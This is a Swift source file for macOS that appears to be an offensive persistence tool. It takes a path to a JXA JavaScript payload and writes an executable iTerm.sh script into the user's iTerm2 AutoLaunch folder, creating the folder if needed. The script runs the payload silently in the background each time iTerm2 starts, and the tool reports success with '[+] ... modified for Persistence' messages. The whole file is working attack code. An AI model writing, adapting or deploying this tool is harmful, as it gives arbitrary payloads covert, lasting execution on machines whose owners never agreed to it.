import Foundation

let uname = NSUserName()
let home = "/Users/\(uname)"
let fileMan = FileManager.default
let scriptname = CommandLine.arguments[0]
var output = ""
var isDir = ObjCBool(true)

if CommandLine.arguments.count != 2 {
    print("Usage: ./\(scriptname) [path_to_.js_jxa_payload]")
    print("exiting...")
}
else {
    let payload = CommandLine.arguments[1]
    if fileMan.fileExists(atPath: payload){
        
        if fileMan.fileExists(atPath: "\(home)/Library/Application Support/iTerm2", isDirectory: &isDir){
            if fileMan.fileExists(atPath: "\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch", isDirectory: &isDir){
                var itermPath = "\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch"
                var itermScriptpath = "\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch/iTerm.sh"
                
                var commandTemplate =
                """
                #!/bin/bash

                osascript \(payload) &
                """
                
                do {
                    try commandTemplate.write(to: URL(fileURLWithPath: itermScriptpath), atomically: false, encoding: .utf8)
                    var attributes = [FileAttributeKey : Any]()
                    attributes[.posixPermissions] = 0o755
                    try fileMan.setAttributes(attributes, ofItemAtPath: itermScriptpath)
                    output += "[+] iTerm Application script at \(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch/iTerm.sh was modified for Persistence.\n"
                    print(output)
                    
                }
                catch let error {
                    print(error)
                }
                
            }
            else {
                do {
                    
                    try fileMan.createDirectory(at: URL(fileURLWithPath:"\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch", isDirectory: true) , withIntermediateDirectories: false, attributes: nil)
                    
                    var itermPath = "\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch"
                    var itermScriptpath = "\(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch/iTerm.sh"
                    
                    var commandTemplate =
                    """
                    #!/bin/bash

                    osascript \(payload) &
                    """
                    
                    try commandTemplate.write(to: URL(fileURLWithPath: itermScriptpath), atomically: false, encoding: .utf8)
                    var attributes = [FileAttributeKey : Any]()
                    attributes[.posixPermissions] = 0o755
                    try fileMan.setAttributes(attributes, ofItemAtPath: itermScriptpath)
                    output += "[+] Created the iTerm AutoLaunch Folder...\n"
                    output += "[+] iTerm Application script at \(home)/Library/Application Support/iTerm2/Scripts/AutoLaunch/iTerm.sh was modified for Persistence.\n"
                    print(output)
                    
                }
                catch let error {
                    print(error)
                }
                
            }
            
            do {
                
                
                
                
            }
            catch let error {
                print(error)
            }
            
        }
        else {
            print("iTerm2 not found on this host. Exiting...")
        }
        
    }
    else {
        print("The .js jxa payload you entered was not found. Exiting...")
    }
    


    
}

